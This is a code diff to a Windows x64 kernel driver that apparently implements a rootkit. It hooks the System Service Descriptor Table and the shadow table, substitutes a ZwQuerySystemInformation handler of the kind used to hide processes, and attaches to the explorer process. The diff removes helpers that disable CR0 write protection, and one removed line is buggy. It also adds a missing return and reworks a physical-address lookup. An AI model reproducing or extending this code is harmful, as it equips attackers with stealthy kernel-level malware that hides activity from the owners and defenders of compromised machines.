@@ -1,25 +1,6 @@
 #include "hookssdt.h"
 #include "dkomeprocess.h"
 
-KIRQL WPOFFx64()
-{
-	KIRQL irql = KeRaiseIrqlToDpcLevel();
-	UINT64 cr0 = __readcr0();
-	cr0 &= 0xFFFFFFFFFFFEFFFF;
-	__writecr0(cr0);
-	_disable();
-	return irql;
-}
-
-void WPONx64(KIRQL irql)
-{
-	UINT64 cr0 = __readcr0();
-	cr0 |= !0xFFFFFFFFFFFEFFFF;
-	_enable();
-	__writecr0(cr0);
-	KeLowerIrql(irql);
-}
-
 NTSTATUS NewZwQuerySystemInformation(
 	IN ULONG SystemInformationClass,
 	IN PVOID SystemInformation,
@@ -125,6 +106,8 @@ PEPROCESS GetExplorer()
 		}
 		list_node = list_node->Flink;
 	} while (SYSPROCESS != (PUCHAR)list_node - 0x188);
+
+	return NULL;
 }
 
 NTSTATUS Hp_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
@@ -142,7 +125,6 @@ NTSTATUS Hp_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegi
 			pdwFindCodeAddress = *(PDWORD)(pucStartSearchAddress + 3) + pucStartSearchAddress + 7;
 			KeServiceDescriptorTable = *(PServiceDescriptorTableEntry_t)pdwFindCodeAddress;
 			KeServiceDescriptorTableShadow = *(PServiceDescriptorTableEntry_t)(pdwFindCodeAddress + 0x60);
-			//Ktrace("OldZwQuerySystemInformation: %llx", (PULONGLONG)&KeServiceDescriptorTableShadow);
 			//SSDT = (ULONG_PTR)pdwFindCodeAddress +
 			//	(((*(PDWORD)pdwFindCodeAddress) >> 24) + 7) + //ae
 			//	(ULONG_PTR)(((*(PDWORD)(pdwFindCodeAddress + 1)) & 0xFFFF) << 8); //id4c
@@ -157,9 +139,8 @@ NTSTATUS Hp_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegi
 
 	PKAPC_STATE mPtr = ExAllocatePool(NonPagedPool, sizeof(KAPC_STATE));
 	KeStackAttachProcess(GetExplorer(), mPtr);
-	PUCHAR test1 = *(PULONGLONG)&KeServiceDescriptorTableShadow & 0xfffffffffffff000;
-	PHYSICAL_ADDRESS pa1 = MmGetPhysicalAddress(*(PULONGLONG)&KeServiceDescriptorTableShadow & 0xfffffffffffff000);
-	PHYSICAL_ADDRESS pa2 = MmGetPhysicalAddress((*(PULONGLONG)&KeServiceDescriptorTableShadow & 0xfffffffffffff000) + 0x1000);
+	PHYSICAL_ADDRESS pa1 = MmGetPhysicalAddress((ULONGLONG)(KeServiceDescriptorTableShadow.ServiceTableBase) & 0xfffffffffffff000);
+	PHYSICAL_ADDRESS pa2 = MmGetPhysicalAddress(((ULONGLONG)(KeServiceDescriptorTableShadow.ServiceTableBase) & 0xfffffffffffff000) + 0x1000);
 	Ktrace("PhysicalAddress1: KeServiceDescriptorTableShadow : %llx \n", pa1.QuadPart);
 	Ktrace("PhysicalAddress2: KeServiceDescriptorTableShadow : %llx \n", pa2.QuadPart);
 	//PUCHAR function = (PUCHAR)KeServiceDescriptorTableShadow.ServiceTableBase + ((LONG)KeServiceDescriptorTableShadow.ServiceTableBase[1] >> 4);
